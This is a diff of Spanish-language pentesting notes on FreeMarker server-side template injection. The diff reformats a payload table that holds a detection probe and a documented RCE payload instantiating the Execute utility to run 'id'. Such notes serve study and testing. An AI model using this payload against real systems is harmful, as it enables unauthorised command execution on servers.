@@ -165,10 +165,10 @@ Java es estricto, pero FreeMarker tiene una utilidad llamada `Execute` que es de
 
 **Tabla de Payloads FreeMarker:**
 
-|**Objetivo**|**Payload**|**Explicación**|
-|---|---|---|
-|**Detectar**|`${7*7}`|Devuelve 49.|
-|**RCE (Documentado)**|`<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`|Instancia la clase Execute utilitaria.|
+| **Objetivo**          | **Payload**                                                              | **Explicación**                        |
+| --------------------- | ------------------------------------------------------------------------ | -------------------------------------- |
+| **Detectar**          | `${7*7}`                                                                 | Devuelve 49.                           |
+| **RCE (Documentado)** | `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }` | Instancia la clase Execute utilitaria. |
 
 > [!EXAMPLE] Caso Real: FreeMarker Básico
 > 
